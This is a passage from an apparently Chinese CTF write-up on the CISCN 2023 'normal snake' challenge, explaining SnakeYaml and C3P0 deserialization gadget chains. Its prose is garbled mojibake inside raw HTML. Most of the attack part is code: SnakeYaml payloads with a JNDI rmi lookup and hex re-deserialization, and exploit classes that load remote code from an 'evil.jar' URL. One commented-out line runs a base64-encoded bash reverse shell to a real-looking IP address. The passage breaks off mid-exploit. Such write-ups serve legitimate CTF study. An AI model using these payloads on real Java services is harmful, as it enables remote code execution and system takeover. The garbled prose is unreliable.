com.mchange.v2.naming.ReferenceableUtils#referenceToObject â€“ URLClassLoader</td><td align="left">URLCLassLoader è¿œç¨‹ç±»åŠ è½½</td><td align="left">JavaåŸç”Ÿååºåˆ—åŒ–</td></tr><tr><td align="left">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject â€“ IndirectlySerialized#getObject() â€“ com.mchange.v2.naming.ReferenceableUtils#referenceToObject â€“ BeanFactory#getInstance</td><td align="left">ä¸å‡ºç½‘çš„å‘½ä»¤æ³¨å…¥</td><td align="left">JavaåŸç”Ÿååºåˆ—åŒ–ä¸å‡ºç½‘</td></tr></tbody></table><p>åœ¨ä¸è€ƒè™‘é¢˜ç›®é»‘åå•çš„æƒ…å†µä¸‹ï¼Œè¿™é‡Œæµ…æµ…äº†è§£äº†ä¸€ä¸‹C3P0çš„å‡ ç§æ‰“æ³•ï¼š</p><h3 id="JndiRefForwardingDataSourceï¼šJndi-æ³¨å…¥"><a href="#JndiRefForwardingDataSourceï¼šJndi-æ³¨å…¥" class="headerlink" title="JndiRefForwardingDataSourceï¼šJndi æ³¨å…¥"></a>JndiRefForwardingDataSourceï¼šJndi æ³¨å…¥</h3><p>æ²¡é”™ï¼Œåˆæ˜¯è€å¸¸å®¢äº†ï¼ŒJNDIæ³¨å…¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.JndiRefForwardingDataSource#setLoginTimeout(<span class="hljs-type">int</span> seconds) å¯ä»¥è§¦å‘ jndi æ³¨å…¥<br></code></pre></td></tr></table></figure><p>pocé“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.JndiRefForwardingDataSource#setLoginTimeout(<span class="hljs-type">int</span> seconds)<br> -com.mchange.v2.c3p0.JndiRefForwardingDataSource#inner()<br>   -com.mchange.v2.c3p0.JndiRefForwardingDataSource#dereference()<br>     -InitialContext#lookup()<br></code></pre></td></tr></table></figure><p>è€ŒSnakeYaml å¯ä»¥è§¦å‘è¯¥ setter æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">poc_snakeyaml</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n jndiName: \&quot;rmi://127.0.0.1:1234/Exploit\&quot;\n loginTimeout: 0&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="WrapperConnectionPoolDataSourceï¼šHex-äºŒæ¬¡ååºåˆ—åŒ–"><a href="#WrapperConnectionPoolDataSourceï¼šHex-äºŒæ¬¡ååºåˆ—åŒ–" class="headerlink" title="WrapperConnectionPoolDataSourceï¼šHex äºŒæ¬¡ååºåˆ—åŒ–"></a>WrapperConnectionPoolDataSourceï¼šHex äºŒæ¬¡ååºåˆ—åŒ–</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource &#123;userOverridesAsString: \&quot;HexAsciiSerializedMap:&quot;</span> +hexAscii+ <span class="hljs-string">&quot;;\&quot;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆ SnakeYaml å¯ä»¥è§¦å‘ Hex äºŒæ¬¡ååºåˆ—åŒ–è¿™æ¡é“¾å­ï¼Ÿ</p><p>é¦–å…ˆ SnakeYaml åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šæ ¹æ® yaml ä¸­çš„ç±»å±æ€§æè¿°è¿›è¡Œç›¸å…³ setter æ–¹æ³•å¹¶è°ƒç”¨ï¼š</p><p>WrapperConnectionPoolDataSourceBase æ˜¯ WrapperConnectionPoolDataSourceçš„çˆ¶ç±»ï¼Œè€Œ<code>com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase#setUserOverridesAsString</code>åœ¨ snakeyaml ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¢«è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserOverridesAsString</span><span class="hljs-params">( String userOverridesAsString )</span> <span class="hljs-keyword">throws</span> PropertyVetoException<br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">oldVal</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.userOverridesAsString;<br>    <span class="hljs-keyword">if</span> ( ! eqOrBothNull( oldVal, userOverridesAsString ) )<br>        vcs.fireVetoableChange( <span class="hljs-string">&quot;userOverridesAsString&quot;</span>, oldVal, userOverridesAsString );<br>    <span class="hljs-built_in">this</span>.userOverridesAsString = userOverridesAsString;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»è¿‡ä¸€ç³»åˆ—è°ƒç”¨æ ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">java.beans.VetoableChangeSupport#fireVetoableChange(String propertyName, Object oldValue, Object newValue)<br>    -java.beans.VetoableChangeSupport#fireVetoableChange(PropertyChangeEvent event)<br>      -java.beans.VetoableChangeListener#vetoableChange()<br>        -C3P0ImplUtils#parseUserOverridesAsString()<br>          -com.mchange.v2.ser.SerializableUtils#fromByteArray(<span class="hljs-type">byte</span>[] bytes)<br>            -com.mchange.v2.ser.SerializableUtils#deserializeFromByteArray(<span class="hljs-type">byte</span>[] bytes)<br></code></pre></td></tr></table></figure><p><code>C3P0ImplUtils#parseUserOverridesAsString</code>æ–¹æ³•ï¼šä»å½¢å‚å¤„æˆªå–æ‰HASM_HEADERï¼š<code>HexAsciiSerializedMap</code>å­—ç¬¦ä¸²ç„¶åè¿›è¡Œhexè§£ç ä¸ºå­—èŠ‚æ•°ç»„ï¼š</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805010542985.png" alt="image-20240805010542985"></p><p>ä¸‹ä¸€ä¸ªæ ˆè°ƒç”¨<code>com.mchange.v2.ser.SerializableUtils#deserializeFromByteArray(byte[] bytes)</code>å¤„ç†å­—èŠ‚æ•°ç»„è°ƒç”¨åŸç”Ÿååºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserializeFromByteArray</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>&#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>    <span class="hljs-keyword">return</span> in.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObjectï¼šjndi-æ³¨å…¥"><a href="#com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObjectï¼šjndi-æ³¨å…¥" class="headerlink" title="com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObjectï¼šjndi æ³¨å…¥"></a>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObjectï¼šjndi æ³¨å…¥</h3><p>å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject()<br>  -IndirectlySerialized#getObject()<br>  -com.mchange.v2.naming.ReferenceIndirector#getObject()<br>    -InitialContext#lookup()<br></code></pre></td></tr></table></figure><p><code>com.mchange.v2.naming.ReferenceIndirector#getObject()</code> å†…éƒ¨å¯ä»¥è§¦å‘ JNDI æ³¨å…¥ï¼š</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805010609440.png" alt="image-20240805010609440"></p><p>çœ‹åˆ°lookupåŸºæœ¬å°±æœ‰è°±äº†ã€‚</p><h3 id="com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObjectï¼šè¿œç¨‹ç±»åŠ è½½"><a href="#com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObjectï¼šè¿œç¨‹ç±»åŠ è½½" class="headerlink" title="com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObjectï¼šè¿œç¨‹ç±»åŠ è½½"></a>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObjectï¼šè¿œç¨‹ç±»åŠ è½½</h3><p>åˆ©ç”¨é“¾å¯å‚è€ƒysoserialï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject()<br>  -IndirectlySerialized#getObject()<br>  -com.mchange.v2.naming.ReferenceIndirector#getObject()<br>    -com.mchange.v2.naming.ReferenceableUtils#referenceToObject(Reference ref,Name name,Context nameCtx,Hashtable env)<br>     -URLClassLoader<br></code></pre></td></tr></table></figure><p>å¯¹äºæœ€åä¸€æ­¥<code>com.mchange.v2.naming.ReferenceableUtils#referenceToObject(Reference ref,Name name,Context nameCtx,Hashtable env)</code></p><p>è¿™é‡Œä¼šè·å–é€šè¿‡ URLClassLoader æ¥åŠ è½½è¿œç¨‹çš„ç±»å¹¶è¿›è¡Œåˆå§‹åŒ–å’Œ getObjectInstance æ–¹æ³•çš„è°ƒç”¨ï¼Œ</p><p>å› æ­¤å¯ä»¥ç›´æ¥åœ¨é™æ€å—é‡Œé¢æ”¾å…¥æ¶æ„æ•°æ®è¿›è¡ŒRCEï¼š</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805010633303.png" alt="image-20240805010633303"></p><p>å¯¹äºå‰é¢ä¸€ä¸ªjndiä¹Ÿæœ‰çš„PoolBackedDataSourceBaseï¼Œè¿™é‡Œä¸€å¹¶è®²äº†ã€‚</p><p>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject()ï¼š</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805010651598.png" alt="image-20240805010651598"></p><p>çº¢æ¡†ä¸­çš„ <code>ois.readObject()</code> è·å–çš„æ˜¯ IndirectlySerialized å¯¹è±¡ï¼ŒIndirectlySerialized æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå…¶çš„å”¯ä¸€å­ç±»æ˜¯ ReferenceSerializedï¼Œ</p><p>ä½†æ˜¯ ReferenceSerialized æ˜¯ ReferenceIndirector ç±»å†…éƒ¨çš„ç§æœ‰ç±»ï¼Œè¯¥ç±»ä¸èƒ½è¿›è¡Œåˆå§‹åŒ–æ“ä½œã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬ç°åœ¨è¦çœ‹ writeObject æ˜¯å¦‚ä½•å°† ReferenceSerialized å†™å…¥åˆ°åºåˆ—åŒ–æµä¸­çš„ã€‚</p><p>ä»åºåˆ—åŒ–è§’åº¦æ¥çœ‹ï¼š</p><p><code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#writeObject()</code> ä¸­ï¼Œ</p><p>å¦‚æœåºåˆ—åŒ–çš„ç±»æ˜¯ä¸å¯åºåˆ—åŒ–çš„è¯(NotSerializableException)ï¼Œå°†ä¼šåœ¨ catch å—ä¸­å¯¹ connectionPoolDataSource å±æ€§ç”¨ ReferenceIndirector.indirectForm æ–¹æ³•å¤„ç†åå†è¿›è¡Œåºåˆ—åŒ–æ“ä½œã€‚(connectionPoolDataSource å±æ€§æ˜¯ ConnectionPoolDataSource ç±»çš„å®ä¾‹)</p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805010709621.png" class="" title="image-20240805010709621"><p><code>ReferenceIndirector.indirectForm</code> æ–¹æ³•ä¸­ä¼šå–å‡ºå‚æ•° ConnectionPoolDataSource å®ä¾‹ä¸­çš„ Reference å¯¹è±¡å¹¶æ„é€ å‡ºå¯åºåˆ—åŒ–çš„ <code>ReferenceSerialized</code> å¯¹è±¡å¹¶è¿”å›ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> IndirectlySerialized <span class="hljs-title function_">indirectForm</span><span class="hljs-params">( Object orig )</span> <span class="hljs-keyword">throws</span> Exception<br>&#123; <br>    <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> ((Referenceable) orig).getReference();<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceSerialized</span>( ref, name, contextName, environmentProperties );<br>&#125;<br>ReferenceSerialized( Reference   reference,<br>                    Name        name,<br>                    Name        contextName,<br>                    Hashtable   env )<br>&#123;<br>    <span class="hljs-built_in">this</span>.reference = reference;<br>    <span class="hljs-built_in">this</span>.name = name;<br>    <span class="hljs-built_in">this</span>.contextName = contextName;<br>    <span class="hljs-built_in">this</span>.env = env;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦åºåˆ—åŒ–ä¸€ä¸ªæ²¡æœ‰å®ç° Serializable æ¥å£çš„ ConnectionPoolDataSource çš„å®ä¾‹æ‰èƒ½å°† IndirectlySerialized å†™å…¥åˆ°åºåˆ—åŒ–æµä¸­ã€‚</strong></p><p>ConnectionPoolDataSource æ¥å£æœ‰ä¿©ä¸ªå­ç±»ï¼Œä¸è¿‡é—æ†¾çš„æ˜¯å®ƒä»¬ä¿©éƒ½å¯ä»¥è¢«åºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">WrapperConnectionPoolDataSource<br>JndiRefConnectionPoolDataSource<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆåªèƒ½è‡ªå·±å†™ä¸€ä¸ªå®ç° ConnectionPoolDataSource æ¥å£çš„ç±»ä½†æ˜¯ä¸å¯è¢«åºåˆ—åŒ–çš„ç±»ï¼Œä¹Ÿå…³ç³»åˆ°è¿™ä¸ªé¢˜çš„expï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0DataSource</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;http://vps:port/evil.jar&quot;</span>);<br>        <span class="hljs-keyword">return</span> reference;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObjectï¼šBeanFactoryä¸å‡ºç½‘"><a href="#com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObjectï¼šBeanFactoryä¸å‡ºç½‘" class="headerlink" title="com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObjectï¼šBeanFactoryä¸å‡ºç½‘"></a>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObjectï¼šBeanFactoryä¸å‡ºç½‘</h3><p><a href="https://www.yulegeyu.com/2021/10/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/">JAVAååºåˆ—åŒ–ä¹‹C3P0ä¸å‡ºç½‘åˆ©ç”¨</a> å’Œ JNDI é«˜ç‰ˆæœ¬æ³¨å…¥å¾ˆåƒã€‚</p><p>å…³äºJNDIé«˜ç‰ˆæœ¬æ³¨å…¥ï¼Œè¿™ä¸ªæˆ‘åœ¨ä¹‹å‰çš„åšå®¢å°±åˆ†æäº†ï¼š<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943">ç»•è¿‡JDKé«˜ç‰ˆæœ¬é™åˆ¶è¿›è¡ŒJNDIæ³¨å…¥ - Eddie_Murphy - åšå®¢å›­ (cnblogs.com)</a></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>è¨€å½’æ­£ä¼ ï¼Œå›åˆ°æ€ä¹ˆæ‰“é¢˜ç›®æœ¬èº«ã€‚</p><p>é¢˜ç›®å…¥å£æ˜¯ yaml.loadï¼Œè¿˜ç»™äº† C3P0 ä¾èµ–ï¼Œåˆè¿‡æ»¤äº† jndi ä¹‹ç±»çš„å…³é”®å­—ï¼Œæ‰€ä»¥èƒ½æƒ³åˆ°è‚¯å®šæ˜¯ <strong>SnakeYaml + C3P0 çš„ HEX äºŒæ¬¡ååºåˆ—åŒ–</strong>ã€‚</p><p>æ ¹æ®ä¸Šé¢çš„ 5 æ¡ C3P0 åˆ©ç”¨é“¾ï¼Œé€‰æ‹© SnakeYaml ååºåˆ—åŒ–è§¦å‘åŸç”Ÿååºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">WrapperConnectionPoolDataSource#setUserOverridesAsString --&gt; ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><p>ç„¶åå†è§¦å‘è¿œç¨‹ç±»åŠ è½½æˆ–è€…jndiæ³¨å…¥:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject --&gt; IndirectlySerialized#getObject() --&gt; InitialContext#lookup<br>or<br>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject --&gt; IndirectlySerialized#getObject() --&gt; com.mchange.v2.naming.ReferenceableUtils#referenceToObject --&gt; URLClassLoader<br></code></pre></td></tr></table></figure><p>å€Ÿç”¨åŸä½œè€… URLClassLoader è¿œç¨‹åŠ è½½ç±»POCç›´æ¥æ‰“äº†ã€‚</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805003817800.png" alt="image-20240805003817800"></p><p>å…¥å£å¾ˆæ˜¾ç„¶åœ¨è¿™ä¸ªyaml.loadï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ–¹æ³•æ˜¯C3P0çš„HEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨ï¼ŒSnakeYamlå°±èµ·åˆ°ä¸€ä¸ªè°ƒç”¨<code>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</code>çš„ä½œç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.snakeyaml;<br><br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;http://vps:port/&quot;</span>);<br><span class="hljs-comment">//            ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);</span><br><span class="hljs-comment">//            resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="hljs-comment">//            resourceRef.add(new StringRefAddr(&quot;x&quot;, &quot;Runtime.getRuntime().exec(&#x27;bash -c \&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzkuMjkuMTcwLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;&#x27;)&quot;));</span><br><span class="hljs-comment">//            return resourceRef;</span><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span 